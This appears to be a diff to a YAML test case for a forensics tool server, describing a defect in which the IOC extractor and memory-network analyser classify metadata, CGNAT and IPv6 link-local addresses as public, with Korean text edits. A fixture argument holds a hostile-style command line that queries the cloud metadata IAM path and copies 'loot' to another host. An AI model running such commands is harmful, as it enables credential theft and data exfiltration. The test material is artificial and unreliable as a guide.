@@ -21,8 +21,8 @@ realism: common
 realism_ko: "클라우드 VM의 메타데이터 서비스 연결과 IPv6 링크 로컬 연결은 흔하다. Volatility 출력은 흉내 낸 것이다."
 coverage: full
 summary: extract_iocs puts the cloud metadata address 169.254.169.254 and the carrier-grade NAT address 100.64.0.5 under "ipv4 public", although neither is routable on the internet, and analyze_memory_network flags connections to the metadata service and to an IPv6 link-local peer as outbound non-RFC1918, so the model treats them as external IOCs to pivot on.
-summary_ko: "extract_iocs는 클라우드 메타데이터 주소 169.254.169.254와 통신사급 NAT 주소 100.64.0.5를 \"ipv4 public\" 아래에 두지만 둘 다 인터넷에서 라우팅되지 않는다. analyze_memory_network는 메타데이터 서비스와 IPv6 링크 로컬 상대에 대한 연결을 outbound non-RFC1918로 표시한다. 그래서 모델은 이들을 피벗할 외부 IOC로 다룬다."
-defect_ko: "정상이라면 169.254/16, 100.64/10, IPv6 링크 로컬은 공인 주소가 아니라고 보아야 하는데, 이 서버는 IPv4 사설 대역과 127만 사설로 본다. 그래서 모델은 메타데이터 서비스와 링크 로컬 상대를 외부 IOC로 잘못 안다."
+summary_ko: "`extract_iocs`는 클라우드 메타데이터 주소 169.254.169.254와 통신사급 NAT 주소 100.64.0.5를 \"ipv4 public\" 아래에 두는데, 둘 다 인터넷에서 라우팅되지 않는다. `analyze_memory_network`도 메타데이터 서비스와 IPv6 링크 로컬 상대와의 연결을 outbound non-RFC1918로 표시한다."
+defect_ko: "이 서버는 IPv4 사설 대역과 127만 사설로 본다. 169.254/16, 100.64/10, IPv6 링크 로컬도 공인 주소가 아니다. 모델은 메타데이터 서비스와 링크 로컬 상대를 외부 IOC로 잘못 안다."
 setup_ko: "메타데이터·CGNAT 주소가 든 글을 넣고, Volatility 대역이 메타데이터 서비스와 IPv6 링크 로컬 연결을 돌려주게 했다."
 env:
   FINDEVIL_VOL: ${STUBS}/vol
@@ -46,11 +46,11 @@ fixture:
     hex: 454d694c0100000000000000000000000000000000000000
 steps:
   - tool: extract_iocs
-    note_ko: "결함이 있는 호출: 글에서 IOC 추출"
+    note_ko: "결함 호출: 글에서 IOC 추출"
     args:
       text: "curl -s http://169.254.169.254/latest/meta-data/iam/ ; ssh admin@100.64.0.5 ; scp loot 10.0.0.8:/tmp/"
   - tool: analyze_memory_network
-    note_ko: "결함이 있는 호출: 메모리 네트워크 분석"
+    note_ko: "결함 호출: 메모리 네트워크 분석"
     args:
       memory_dump_path: ${EVIDENCE}/mem/host.lime
 expect:
